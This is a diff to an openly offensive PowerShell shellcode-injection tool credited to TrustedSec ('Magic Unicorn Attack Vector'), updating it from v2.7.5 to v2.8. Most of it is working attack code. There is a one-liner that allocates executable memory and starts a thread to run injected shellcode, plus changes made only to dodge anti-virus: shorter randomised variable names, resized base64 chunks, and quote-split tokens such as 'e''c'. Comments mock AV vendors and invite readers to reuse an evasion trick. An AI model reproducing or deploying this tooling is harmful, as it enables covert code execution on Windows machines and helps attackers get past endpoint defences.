@@ -218,7 +218,7 @@ The last one will use a 500 character string instead of the default 380, resulti
 # usage banner
 def gen_usage():
     print(
-        "-------------------- Magic Unicorn Attack Vector v2.7.5 -----------------------------")
+        "-------------------- Magic Unicorn Attack Vector v2.8 -----------------------------")
     print("\nNative x86 powershell injection attacks on any Windows platform.")
     print(
         "Written by: Dave Kennedy at TrustedSec (https://www.trustedsec.com)")
@@ -471,16 +471,15 @@ def gen_shellcode_attack(payload, ipaddr, port):
 
     # added random vars before and after to change strings - AV you are
     # seriously ridiculous.
-    var1 = generate_random_string(3, 4)
-    var2 = generate_random_string(3, 4)
-    var3 = generate_random_string(3, 4)
-    var4 = generate_random_string(3, 4)
-    var5 = generate_random_string(3, 4)
-    var6 = generate_random_string(3, 4)
+    var1 = generate_random_string(2, 3)
+    var2 = generate_random_string(2, 3)
+    var3 = generate_random_string(2, 3)
+    var4 = generate_random_string(2, 3)
+    var5 = generate_random_string(2, 3)
+    var6 = generate_random_string(2, 3)
 
     # one line shellcode injection with native x86 shellcode
-    powershell_code = (
-        r"""$1 = '$c = ''[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = %s;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};';$e = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1));$2 = "-ec ";if([IntPtr]::Size -eq 8){$3 = $env:SystemRoot + "\syswow64\WindowsPowerShell\v1.0\powershell";iex "& $3 $2 $e"}else{;iex "& powershell $2 $e";}""" % shellcode)
+    powershell_code = (r"""$1 = '$c = ''[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = %s;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};';$e = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1));$2 = "-e''c ";if([IntPtr]::Size -eq 8){$3 = $env:SystemRoot + "\syswow64\WindowsPowerShell\v1.0\powershell";iex "& $3 $2 $e"}else{;iex "& powershell $2 $e";}""" % shellcode)
 
     # run it through a lame var replace
     powershell_code = powershell_code.replace("$1", "$" + var1).replace("$c", "$" + var2).replace(
@@ -506,15 +505,15 @@ def format_payload(powershell_code, attack_type, attack_modifier, option):
     print("Twitter: @TrustedSec, @HackingDave")
     print("\nHappy Magic Unicorns.")
 
-    ran1 = generate_random_string(2, 5)
-    ran2 = generate_random_string(2, 5)
-    ran3 = generate_random_string(2, 5)
-    ran4 = generate_random_string(2, 5)
+    ran1 = generate_random_string(2, 3)
+    ran2 = generate_random_string(2, 3)
+    ran3 = generate_random_string(2, 3)
+    ran4 = generate_random_string(2, 3)
 
     # honestly anti-virus is one of the most annoying programs ever created - it has nothing to do with security, but if something becomes popular, lets write a signature that annoys the author. So in this example, we say F A/V because it's literally terrible. What AV - i.e. Kaspersky in this case was doing was evaluating the base64 encoded command - so what do we do? Chunk it up because anti-virus is absolutely ridiculous. Of course this gets around it because it doesn't know how to interpret PowerShell. Instead, what you need to be looking for is long powershell statements, toString() as suspicious, etc. That'll never happen because A/V is suppose to be signature based on something they can catch. You all literally are a dying breed. Sorry for the rant, but it's annoying to have to sit here and rewrite stupid stuff because your wrote a shitty sig. -Dave
     fuckav = base64.b64encode(powershell_code.encode('utf_16_le'))
     # here we mangle our encodedcommand by splitting it up in random chunks
-    avsux = randomint = random.randint(300,340)
+    avsux = randomint = random.randint(900,940)
     avnotftw = [fuckav[i: i + avsux] for i in range(0, len(fuckav), avsux)]
     haha_av = ""
     counter = 0
@@ -524,10 +523,11 @@ def format_payload(powershell_code, attack_type, attack_modifier, option):
         if counter > 0: haha_av = haha_av + "'" 
         surprise_surprise = non_signature + "'"
         haha_av = haha_av + surprise_surprise #ThisShouldKeepMattHappy
+        haha_av = haha_av.replace("==", "'+'==")
         counter = 1
 
+    full_attack = '''powershell -w 1 -C "s''v {0} -;s''v {1} e''c;s''v {2} ((g''v {3}).value.toString()+(g''v {4}).value.toString());powershell (g''v {5}).value.toString() (\''''.format(ran1, ran2, ran3, ran1, ran2, ran3) + haha_av + ")" + '"'
     # powershell -w 1 -C "powershell ([char]45+[char]101+[char]99) YwBhAGwAYwA="  <-- Another nasty one that should evade. If you are reading the source, feel free to use and tweak
-    full_attack = 'powershell -w 1 -C "sv {0} -;sv {1} ec;sv {2} ((gv {3}).value.toString()+(gv {4}).value.toString());powershell (gv {5}).value.toString() (\''.format(ran1, ran2, ran3, ran1, ran2, ran3) + haha_av + ")" + '"'
 
     if attack_type == "msf":
         if attack_modifier == "macro":
